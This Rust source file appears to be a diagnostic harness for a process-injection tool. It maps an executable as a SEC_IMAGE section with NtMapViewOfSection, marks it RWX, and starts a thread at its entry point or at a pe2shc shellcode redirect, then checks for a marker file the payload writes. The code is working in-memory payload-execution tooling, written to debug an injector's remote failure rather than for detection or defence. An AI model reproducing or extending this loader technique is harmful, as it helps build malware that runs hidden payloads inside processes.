//! Local, in-process diagnostic for the *execution mechanism* only.
//!
//! It reproduces what the injector does to run the payload - create a SEC_IMAGE
//! section from `target.exe`, map it (bare `NtMapViewOfSection`, no loader), make
//! it RWX, and start a thread at `base + AddressOfEntryPoint` - but entirely
//! inside this (non-elevated, non-COM, debuggable) process. If the payload's
//! marker appears here, the map+thread mechanism is sound and the remote failure
//! is injection-specific; if it doesn't, the bug is in the payload/mapping.

use std::ffi::c_void;
use std::ptr::null_mut;

use anyhow::{anyhow, bail, Context, Result};
use windows::core::PCSTR;
use windows::Wdk::Storage::FileSystem::NtCreateSection;
use windows::Wdk::System::SystemServices::PAGE_READONLY;
use windows::Win32::Foundation::GENERIC_READ;
use windows::Win32::Foundation::{CloseHandle, HANDLE, NTSTATUS};
use windows::Win32::Storage::FileSystem::{
    CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING,
};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_RESERVE, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS,
    SECTION_ALL_ACCESS, SEC_IMAGE,
};
use windows::Win32::System::Threading::{
    CreateThread, GetCurrentProcess, WaitForSingleObject, THREAD_CREATION_FLAGS,
};

// Bare native map - the windows crate doesn't surface NtMapViewOfSection.
#[link(name = "ntdll.dll", kind = "raw-dylib", modifiers = "+verbatim")]
extern "system" {
    fn NtMapViewOfSection(
        section: HANDLE,
        process: HANDLE,
        base: *mut *mut c_void,
        zero_bits: usize,
        commit_size: usize,
        section_offset: *mut i64,
        view_size: *mut usize,
        inherit: i32,
        alloc_type: u32,
        win32_protect: u32,
    ) -> NTSTATUS;
}

const VIEW_SHARE: i32 = 1;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

fn pe_entry_and_image_size(bytes: &[u8]) -> Result<(u32, u32, u64)> {
    let e_lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into().unwrap()) as usize;
    if &bytes[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        bail!("not a PE");
    }
    let opt = e_lfanew + 0x18;
    let entry = u32::from_le_bytes(bytes[opt + 0x10..opt + 0x14].try_into().unwrap());
    let image_base = u64::from_le_bytes(bytes[opt + 0x18..opt + 0x20].try_into().unwrap());
    let size_of_image = u32::from_le_bytes(bytes[opt + 0x38..opt + 0x3C].try_into().unwrap());
    Ok((entry, size_of_image, image_base))
}

fn main() -> Result<()> {
    let path = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "target.exe".into());
    let bytes = std::fs::read(&path).with_context(|| format!("reading {path}"))?;
    let (entry_rva, size_of_image, image_base) = pe_entry_and_image_size(&bytes)?;
    println!(
        "[*] {path}: ImageBase={:#X}, AddressOfEntryPoint={:#X}, SizeOfImage={:#X}",
        image_base, entry_rva, size_of_image
    );

    // Remove any stale marker so we can confirm THIS run wrote it.
    for p in [
        r"C:\Users\Public\inject_proof.txt",
        r"C:\Windows\Temp\inject_proof.txt",
        r"C:\ProgramData\inject_proof.txt",
    ] {
        let _ = std::fs::remove_file(p);
    }

    // If "reloc" is passed, reserve the preferred ImageBase first so the section
    // is forced to map at a DIFFERENT base - reproducing the injection (where the
    // target already occupies 0x140000000). This reveals base/PIC sensitivity.
    let force_reloc = std::env::args().any(|a| a == "reloc");
    if force_reloc {
        let p = unsafe {
            VirtualAlloc(
                Some(image_base as *const c_void),
                size_of_image as usize,
                MEM_RESERVE,
                PAGE_NOACCESS,
            )
        };
        println!(
            "[*] reloc: reserved preferred base {:#X} -> {}",
            image_base,
            if p.is_null() {
                "FAILED (already taken)"
            } else {
                "ok (map will relocate)"
            }
        );
    }

    let path_c = format!("{path}\0");
    let file = unsafe {
        CreateFileA(
            PCSTR(path_c.as_ptr()),
            GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .context("CreateFileA(target)")?
    };

    let mut section = HANDLE::default();
    let status = unsafe {
        NtCreateSection(
            &mut section,
            SECTION_ALL_ACCESS.0,
            None,
            None,
            PAGE_READONLY,
            SEC_IMAGE.0,
            file,
        )
    };
    if status.is_err() {
        bail!("NtCreateSection failed: {status:?}");
    }

    let mut base: *mut c_void = null_mut();
    let mut view_size: usize = 0;
    let status = unsafe {
        NtMapViewOfSection(
            section,
            GetCurrentProcess(),
            &mut base,
            0,
            0,
            null_mut(),
            &mut view_size,
            VIEW_SHARE,
            0,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if status.is_err() {
        bail!("NtMapViewOfSection failed: {status:?}");
    }

    let base_u = base as usize;

    // pe2shc-converted shellcode runs from the IMAGE BASE (the redirect written
    // into the PE header), which then jumps to the appended loader stub. A plain
    // PIC payload instead runs from AddressOfEntryPoint. Default = entry; pass
    // "from0" on the command line for a pe2shc payload.
    let from_base = std::env::args().any(|a| a == "from0");
    let entry_addr = if from_base {
        base_u
    } else {
        base_u + entry_rva as usize
    };

    // SEC_IMAGE maps the headers page read-only, so the base-0 redirect would
    // not be executable. Make the whole image RWX (exactly what the injector's
    // run-from-memory stage does) so either start address can run.
    let mut old = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(
            base,
            size_of_image as usize,
            PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READWRITE),
            &mut old,
        )
        .context("VirtualProtect(image RWX)")?;
    }

    println!("[*] Mapped at {:#X}, view size {:#X}", base_u, view_size);
    println!(
        "[*] Start at {:#X} ({})",
        entry_addr,
        if from_base { "image base / pe2shc redirect" } else { "AddressOfEntryPoint" }
    );

    // Show the first 16 bytes at the entry - confirms the code is actually there
    // (non-zero, looks like a prologue) rather than zero/unbacked memory.
    let entry_bytes = unsafe { std::slice::from_raw_parts(entry_addr as *const u8, 16) };
    println!("[*] Bytes at entry: {:02X?}", entry_bytes);

    println!("[*] Starting thread at entry...");
    let start: unsafe extern "system" fn(*mut c_void) -> u32 =
        unsafe { std::mem::transmute(entry_addr) };
    let thread = unsafe {
        CreateThread(None, 0, Some(start), None, THREAD_CREATION_FLAGS(0), None)
            .context("CreateThread")?
    };

    unsafe { WaitForSingleObject(thread, 4000) };
    unsafe {
        let _ = CloseHandle(thread);
        let _ = CloseHandle(section);
        let _ = CloseHandle(file);
    }

    let found = [
        r"C:\Users\Public\inject_proof.txt",
        r"C:\Windows\Temp\inject_proof.txt",
        r"C:\ProgramData\inject_proof.txt",
    ]
    .into_iter()
    .find(|p| std::path::Path::new(p).exists());

    match found {
        Some(p) => {
            let c = std::fs::read_to_string(p).unwrap_or_default();
            println!("[+] SUCCESS: payload ran via SEC_IMAGE map + thread. {p} => {}", c.trim());
            Ok(())
        }
        None => Err(anyhow!(
            "payload did NOT write a marker - the map+thread mechanism does not execute it (bug is in the payload/mapping, not the injection)"
        )),
    }
}
